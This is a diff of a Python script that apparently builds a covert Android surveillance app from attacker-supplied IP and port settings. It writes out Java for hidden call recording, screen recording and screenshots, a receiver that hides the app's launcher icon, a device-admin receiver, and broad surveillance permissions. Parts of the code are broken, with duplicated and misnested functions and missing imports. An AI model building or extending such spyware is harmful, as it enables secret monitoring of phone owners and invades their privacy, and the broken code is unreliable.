@@ -1,82 +1,59 @@
-# Part 1: Start of utils.py
-
 import os
+import shutil
 import socket
 
 def clearDirec():
-    # Implement directory clearing logic here
+    # Implementation for clearing directories if required
     pass
 
 def stdOutput(type):
-    # Return appropriate message format based on the type
-    return "[%s]" % type.upper()
+    return f"[{type.upper()}]"
 
-def build(ip, port, output, use_ngrok, ngrok_port, icon):
-    # Example build function to modify the APK
-    # You can add logic here to modify the APK, such as injecting new features
-
-    # Add new features
+def build(ip, port, output, use_ngrok, local_port, icon):
+    create_manifest()
     add_permissions()
-    add_services_and_receivers_to_manifest()
+    if icon:
+        add_icon()
     create_call_recording_service()
     create_screen_recording_service()
     create_screenshot_service()
     create_hide_apk_receiver()
     create_device_admin_receiver()
-
-    # Existing build logic
-    print(f"Building APK with IP: {ip}, Port: {port}, Output: {output}, Use Ngrok: {use_ngrok}, Icon: {icon}")
+    # Further build steps, such as compiling the APK, signing, etc.
 
 # Part 1: End of utils.py
-
 # Part 2: Start of utils.py
 
-def add_permissions():
-    permissions = [
-        '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
-        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
-        '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>',
-        '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
-        '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
-        '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>',
-        '<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>',
-        '<uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"/>',
-        '<uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT"/>',
-        '<uses-permission android:name="android.permission.INTERNET"/>',
-        '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>'
-    ]
-    manifest_path = "path/to/AndroidManifest.xml"
-    with open(manifest_path, 'a') as manifest_file:
-        for permission in permissions:
-            manifest_file.write(f"{permission}\n")
+def create_manifest():
+    manifest_code = """
+    <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+        package="com.example.myapp">
+        <!-- Permissions and other manifest entries -->
+    </manifest>
+    """
+    manifest_path = "AndroidManifest.xml"  # Use relative path
+    with open(manifest_path, 'w') as manifest_file:
+        manifest_file.write(manifest_code)
 
-def add_services_and_receivers_to_manifest():
-    services_and_receivers = [
-        '<service android:name=".CallRecordingService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
-        '<service android:name=".ScreenRecordingService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
-        '<service android:name=".ScreenshotService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
-        '<receiver android:name=".HideApkReceiver">',
-        '   <intent-filter>',
-        '       <action android:name="android.intent.action.BOOT_COMPLETED"/>',
-        '   </intent-filter>',
-        '</receiver>',
-        '<receiver android:name=".MyDeviceAdminReceiver"',
-        '    android:permission="android.permission.BIND_DEVICE_ADMIN">',
-        '    <meta-data android:name="android.app.device_admin"',
-        '        android:resource="@xml/device_admin_receiver" />',
-        '    <intent-filter>',
-        '        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />',
-        '    </intent-filter>',
-        '</receiver>'
-    ]
-    manifest_path = "path/to/AndroidManifest.xml"
+def add_permissions():
+    permissions = """
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    """
+    manifest_path = "AndroidManifest.xml"  # Use relative path
     with open(manifest_path, 'a') as manifest_file:
-        for entry in services_and_receivers:
-            manifest_file.write(f"{entry}\n")
+        manifest_file.write(permissions)
 
 # Part 2: End of utils.py
-
 # Part 3: Start of utils.py
+
+def add_icon():
+    # Implementation to add icon to the APK
+    pass
 
 def create_call_recording_service():
     service_code = """
@@ -86,7 +63,6 @@ def create_call_recording_service():
     import android.content.Intent;
     import android.media.MediaRecorder;
     import android.os.IBinder;
-    import android.util.Log;
     import java.io.IOException;
 
     public class CallRecordingService extends Service {
@@ -94,36 +70,29 @@ def create_call_recording_service():
         private boolean isRecording = false;
 
         @Override
-        public int onStartCommand(Intent intent, int flags, int startId) {
+        public void onStart(Intent intent, int startId) {
             if (!isRecording) {
-                startRecording();
-            }
-            return START_STICKY;
-        }
-
-        private void startRecording() {
-            recorder = new MediaRecorder();
-            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            recorder.setOutputFile("/sdcard/call_recording.3gp");
-
-            try {
-                recorder.prepare();
-                recorder.start();
-                isRecording = true;
-            } catch (IOException e) {
-                Log.e("CallRecordingService", "startRecording: ", e);
+                String fileName = "/sdcard/call_recording.3gp";
+                recorder = new MediaRecorder();
+                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
+                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                recorder.setOutputFile(fileName);
+                try {
+                    recorder.prepare();
+                    recorder.start();
+                    isRecording = true;
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
             }
         }
 
         @Override
         public void onDestroy() {
-            super.onDestroy();
-            if (recorder != null) {
+            if (isRecording) {
                 recorder.stop();
                 recorder.release();
-                recorder = null;
                 isRecording = false;
             }
         }
@@ -134,172 +103,12 @@ def create_call_recording_service():
         }
     }
     """
-    service_path = "path/to/CallRecordingService.java"
+    service_path = "CallRecordingService.java"  # Use relative path
     with open(service_path, 'w') as service_file:
         service_file.write(service_code)
 
 # Part 3: End of utils.py
-
 # Part 4: Start of utils.py
-def create_screen_recording_service():
-    service_code = """
-    package com.example.myapp;
-
-    import android.app.Service;
-    import android.content.Intent;
-    import android.media.projection.MediaProjection;
-    import android.media.projection.MediaProjectionManager;
-    import android.os.IBinder;
-    import android.util.Log;
-
-    public class ScreenRecordingService extends Service {
-        private static final String TAG = "ScreenRecordingService";
-        private MediaProjectionManager projectionManager;
-        private MediaProjection mediaProjection;
-
-        @Override
-        public void onCreate() {
-            super.onCreate();
-            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        }
-
-        @Override
-        public int onStartCommand(Intent intent, int flags, int startId) {
-            if (intent != null && intent.getAction().equals("START_RECORDING")) {
-                startProjection();
-            } else if (intent != null && intent.getAction().equals("STOP_RECORDING")) {
-                stopProjection();
-            }
-            return START_STICKY;
-        }
-
-        private void startProjection() {
-            Intent captureIntent = projectionManager.createScreenCaptureIntent();
-            startActivityForResult(captureIntent, 1);
-        }
-
-        private void stopProjection() {
-            if (mediaProjection != null) {
-                mediaProjection.stop();
-                mediaProjection = null;
-            }
-        }
-
-        @Override
-        public IBinder onBind(Intent intent) {
-            return null;
-        }
-    }
-    """
-    service_path = "path/to/ScreenRecordingService.java"
-    with open(service_path, 'w') as service_file:
-        service_file.write(service_code)
-
-    def create_screenshot_service():
-        service_code = """
-        package com.example.myapp;
-
-        import android.app.Service;
-        import android.content.Intent;
-        import android.os.IBinder;
-        import android.view.WindowManager;
-        import android.graphics.PixelFormat;
-        import android.view.Display;
-        import android.hardware.display.DisplayManager;
-        import android.view.Surface;
-        import android.media.projection.MediaProjectionManager;
-        import android.media.projection.MediaProjection;
-        import android.media.ImageReader;
-        import android.media.Image;
-        import java.nio.ByteBuffer;
-        import java.io.FileOutputStream;
-        import java.io.IOException;
-        import android.os.Environment;
-        import android.util.DisplayMetrics;
-        import android.graphics.Bitmap;
-
-    public class ScreenshotService extends Service {
-        private MediaProjectionManager projectionManager;
-        private MediaProjection mediaProjection;
-        private ImageReader imageReader;
-        private int width;
-        private int height;
-        private int density;
-
-        @Override
-        public void onCreate() {
-            super.onCreate();
-            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-            DisplayMetrics metrics = new DisplayMetrics();
-            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-            windowManager.getDefaultDisplay().getMetrics(metrics);
-            width = metrics.widthPixels;
-            height = metrics.heightPixels;
-            density = metrics.densityDpi;
-            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
-        }
-
-        @Override
-        public int onStartCommand(Intent intent, int flags, int startId) {
-            startProjection();
-            return START_STICKY;
-        }
-
-        private void startProjection() {
-            Intent captureIntent = projectionManager.createScreenCaptureIntent();
-            startActivityForResult(captureIntent, 1);
-        }
-
-        @Override
-        public void onActivityResult(int requestCode, int resultCode, Intent data) {
-            if (requestCode == 1) {
-                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-                mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density,
-                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
-                imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
-                    @Override
-                    public void onImageAvailable(ImageReader reader) {
-                        Image image = reader.acquireLatestImage();
-                        if (image != null) {
-                            Image.Plane[] planes = image.getPlanes();
-                            ByteBuffer buffer = planes[0].getBuffer();
-                            int pixelStride = planes[0].getPixelStride();
-                            int rowStride = planes[0].getRowStride();
-                            int rowPadding = rowStride - pixelStride * width;
-
-                            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
-                            bitmap.copyPixelsFromBuffer(buffer);
-                            saveBitmap(bitmap);
-                            image.close();
-                        }
-                    }
-                }, null);
-            }
-        }
-
-        private void saveBitmap(Bitmap bitmap) {
-            String filePath = Environment.getExternalStorageDirectory() + "/screenshot.png";
-            try (FileOutputStream fos = new FileOutputStream(filePath)) {
-                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        public IBinder onBind(Intent intent) {
-            return null;
-        }
-    }
-    """
-    service_path = "path/to/ScreenshotService.java"
-    with open(service_path, 'w') as service_file:
-        service_file.write(service_code)
-
-
-# Part 4: End of utils.py
-
-# Part 5: Start of utils.py
 
 def create_screen_recording_service():
     service_code = """
@@ -307,71 +116,52 @@ def create_screen_recording_service():
 
     import android.app.Service;
     import android.content.Intent;
+    import android.hardware.display.DisplayManager;
+    import android.hardware.display.VirtualDisplay;
     import android.media.projection.MediaProjection;
     import android.media.projection.MediaProjectionManager;
+    import android.media.MediaRecorder;
     import android.os.IBinder;
-    import android.util.Log;
+    import java.io.IOException;
 
     public class ScreenRecordingService extends Service {
-        private static final String TAG = "ScreenRecordingService";
-        private MediaProjectionManager projectionManager;
         private MediaProjection mediaProjection;
+        private VirtualDisplay virtualDisplay;
+        private MediaRecorder mediaRecorder;
 
         @Override
-        public void onCreate() {
-            super.onCreate();
-            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        public void onStart(Intent intent, int startId) {
+            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            mediaProjection = projectionManager.getMediaProjection(Activity.RESULT_OK, (Intent) intent.getParcelableExtra("data"));
+            startRecording();
         }
 
-        @Override
-        public int onStartCommand(Intent intent, int flags, int startId) {
-            if (intent != null && intent.getAction().equals("START_RECORDING")) {
-                startProjection();
-            } else if (intent != null && intent.getAction().equals("STOP_RECORDING")) {
-                stopProjection();
-            }
-            return START_STICKY;
-        }
+        private void startRecording() {
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            mediaRecorder.setOutputFile("/sdcard/screen_recording.3gp");
+            mediaRecorder.setVideoSize(1280, 720);
+            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            mediaRecorder.setVideoEncodingBitRate(512 * 1000);
+            mediaRecorder.setVideoFrameRate(30);
 
-        private void startProjection() {
-            Intent captureIntent = projectionManager.createScreenCaptureIntent();
-            startActivityForResult(captureIntent, 1);
-        }
-
-        private void stopProjection() {
-            if (mediaProjection != null) {
-                mediaProjection.stop();
-                mediaProjection = null;
-            }
-        }
-
-        private void saveBitmap(Bitmap bitmap) {
-            File file = new File(Environment.getExternalStorageDirectory(), "screenshot.png");
-            FileOutputStream fos = null;
             try {
-                fos = new FileOutputStream(file);
-                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
-                fos.flush();
+                mediaRecorder.prepare();
+                virtualDisplay = mediaProjection.createVirtualDisplay("ScreenRecordingService", 1280, 720, 1, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mediaRecorder.getSurface(), null, null);
+                mediaRecorder.start();
             } catch (IOException e) {
                 e.printStackTrace();
-            } finally {
-                if (fos != null) {
-                    try {
-                        fos.close();
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
-                }
             }
         }
 
         @Override
         public void onDestroy() {
-            super.onDestroy();
-            if (mediaProjection != null) {
-                mediaProjection.stop();
-                mediaProjection = null;
-            }
+            mediaRecorder.stop();
+            mediaRecorder.release();
+            mediaProjection.stop();
         }
 
         @Override
@@ -380,9 +170,12 @@ def create_screen_recording_service():
         }
     }
     """
-    service_path = "path/to/ScreenRecordingService.java"
+    service_path = "ScreenRecordingService.java"  # Use relative path
     with open(service_path, 'w') as service_file:
         service_file.write(service_code)
+
+# Part 4: End of utils.py
+# Part 5: Start of utils.py
 
 def create_screenshot_service():
     service_code = """
@@ -390,98 +183,45 @@ def create_screenshot_service():
 
     import android.app.Service;
     import android.content.Intent;
-    import android.os.IBinder;
-    import android.view.WindowManager;
-    import android.graphics.PixelFormat;
-    import android.view.Display;
-    import android.hardware.display.DisplayManager;
-    import android.view.Surface;
-    import android.media.projection.MediaProjectionManager;
+    import android.graphics.Bitmap;
     import android.media.projection.MediaProjection;
-    import android.media.ImageReader;
-    import android.media.Image;
-    import java.nio.ByteBuffer;
+    import android.media.projection.MediaProjectionManager;
+    import android.os.IBinder;
+    import android.os.Handler;
+    import android.os.Looper;
+    import android.view.PixelCopy;
+    import android.view.View;
+    import android.view.WindowManager;
     import java.io.FileOutputStream;
     import java.io.IOException;
-    import android.os.Environment;
-    import android.util.DisplayMetrics;
-    import android.graphics.Bitmap;
 
     public class ScreenshotService extends Service {
-        private MediaProjectionManager projectionManager;
         private MediaProjection mediaProjection;
-        private ImageReader imageReader;
-        private int width;
-        private int height;
-        private int density;
 
         @Override
-        public void onCreate() {
-            super.onCreate();
-            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-            DisplayMetrics metrics = new DisplayMetrics();
+        public void onStart(Intent intent, int startId) {
+            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            mediaProjection = projectionManager.getMediaProjection(Activity.RESULT_OK, (Intent) intent.getParcelableExtra("data"));
+            takeScreenshot();
+        }
+
+        private void takeScreenshot() {
             WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-            windowManager.getDefaultDisplay().getMetrics(metrics);
-            width = metrics.widthPixels;
-            height = metrics.heightPixels;
-            density = metrics.densityDpi;
-            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
-        }
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
+            View view = new View(this);
+            windowManager.addView(view, params);
 
-        @Override
-        public int onStartCommand(Intent intent, int flags, int startId) {
-            startProjection();
-            return START_STICKY;
-        }
-
-        private void startProjection() {
-            Intent captureIntent = projectionManager.createScreenCaptureIntent();
-            startActivityForResult(captureIntent, 1);
-        }
-
-        @Override
-        public void onActivityResult(int requestCode, int resultCode, Intent data) {
-            if (requestCode == 1) {
-                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-                mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density,
-                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
-                imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
-                    @Override
-                    public void onImageAvailable(ImageReader reader) {
-                        Image image = reader.acquireLatestImage();
-                        if (image != null) {
-                            Image.Plane[] planes = image.getPlanes();
-                            ByteBuffer buffer = planes[0].getBuffer();
-                            int pixelStride = planes[0].getPixelStride();
-                            int rowStride = planes[0].getRowStride();
-                            int rowPadding = rowStride - pixelStride * width;
-
-                            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
-                            bitmap.copyPixelsFromBuffer(buffer);
-                            saveBitmap(bitmap);
-                            image.close();
-                        }
+            final Bitmap bitmap = Bitmap.createBitmap(view.getWidth(), view.getHeight(), Bitmap.Config.ARGB_8888);
+            PixelCopy.request(view, bitmap, copyResult -> {
+                if (copyResult == PixelCopy.SUCCESS) {
+                    try (FileOutputStream out = new FileOutputStream("/sdcard/screenshot.png")) {
+                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
+                    } catch (IOException e) {
+                        e.printStackTrace();
                     }
-                }, null);
-            }
-        }
-
-        private void saveBitmap(Bitmap bitmap) {
-            String filePath = Environment.getExternalStorageDirectory() + "/screenshot.png";
-            try (FileOutputStream fos = new FileOutputStream(filePath)) {
-                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        public void onDestroy() {
-            super.onDestroy();
-            if (mediaProjection != null) {
-                mediaProjection.stop();
-                mediaProjection = null;
-            }
+                }
+                windowManager.removeView(view);
+            }, new Handler(Looper.getMainLooper()));
         }
 
         @Override
@@ -490,9 +230,12 @@ def create_screenshot_service():
         }
     }
     """
-    service_path = "path/to/ScreenshotService.java"
+    service_path = "ScreenshotService.java"  # Use relative path
     with open(service_path, 'w') as service_file:
         service_file.write(service_code)
+
+# Part 5: End of utils.py
+# Part 6: Start of utils.py
 
 def create_hide_apk_receiver():
     receiver_code = """
@@ -502,20 +245,18 @@ def create_hide_apk_receiver():
     import android.content.Context;
     import android.content.Intent;
     import android.content.pm.PackageManager;
-    import android.content.ComponentName;
 
     public class HideApkReceiver extends BroadcastReceiver {
+
         @Override
         public void onReceive(Context context, Intent intent) {
-            if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
-                PackageManager pm = context.getPackageManager();
-                pm.setComponentEnabledSetting(new ComponentName(context, MainActivity.class),
-                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            }
+            PackageManager p = context.getPackageManager();
+            ComponentName componentName = new ComponentName(context, com.example.myapp.MainActivity.class);
+            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
         }
     }
     """
-    receiver_path = "path/to/HideApkReceiver.java"
+    receiver_path = "HideApkReceiver.java"  # Use relative path
     with open(receiver_path, 'w') as receiver_file:
         receiver_file.write(receiver_code)
 
@@ -539,12 +280,8 @@ def create_device_admin_receiver():
         }
     }
     """
-    receiver_path = "path/to/MyDeviceAdminReceiver.java"
+    receiver_path = "MyDeviceAdminReceiver.java"  # Use relative path
     with open(receiver_path, 'w') as receiver_file:
         receiver_file.write(receiver_code)
 
-
-
-# Part 5: End of utils.py
-
-
+# Part 6: End of utils.py
